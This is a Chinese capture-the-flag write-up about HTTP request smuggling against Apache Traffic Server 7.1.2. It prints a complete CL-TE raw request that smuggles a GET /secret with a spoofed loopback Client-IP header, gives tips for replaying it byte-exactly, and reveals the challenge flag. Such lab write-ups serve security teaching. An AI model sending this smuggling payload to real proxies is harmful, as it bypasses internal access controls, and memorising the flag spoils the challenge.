# 宝藏走私者

## 题目简述

目标由 Apache Traffic Server 7.1.2 反向代理到后端服务。前后端对同时出现的 `Content-Length` 与 `Transfer-Encoding: chunked` 解析不一致，可以构造 CL-TE HTTP 请求走私，把一个访问 `/secret` 的内部请求藏在首个请求体之后。

## 解题过程

CL-TE 的关键是让前置代理按 `Content-Length` 确定请求体边界，而后端按分块编码解析。后端读到大小为 `0` 的分块后认为第一段请求体已经结束，余下字节便会被当成下一条请求。

官方 WP 给出的原始请求如下；发送时必须保留 CRLF 和空行，不能让 HTTP 客户端重新规范化请求：

```http
POST / HTTP/1.1
Host: hrs.localhost
Content-Length: 73
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: hrs.localhost
Client-IP: 127.0.0.1

```

`Client-IP: 127.0.0.1` 用于通过 `/secret` 的本地来源检查。实际复现时应按发送出的字节重新核对 `Content-Length`；换行由 LF 变成 CRLF 后，长度也会变化。将该请求通过原始 TCP、Burp Repeater 或关闭自动修正功能的客户端发给代理，即可让后端处理走私出的请求。

同期复盘保留的响应正文中，后端返回：

```text
hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!}
```

该返回值来自 [Zry.IO 的 HGAME 2021 Week 1 记录](https://zry.io/zh/cybersec/ctf/hgame2021-week-1-writeup/)；正文已包含无需访问外链即可复现的走私机制和原始报文。

## 方法总结

本题的识别信号是旧版反向代理、`Content-Length` 与 `Transfer-Encoding` 同时存在，以及仅允许内部访问的后端路径。请求走私不能只复制可见文本：前后端的边界差异依赖精确字节、CRLF 和长度字段。复现时应明确哪一层使用 CL、哪一层使用 TE，并用抓包确认代理没有重写关键头部。
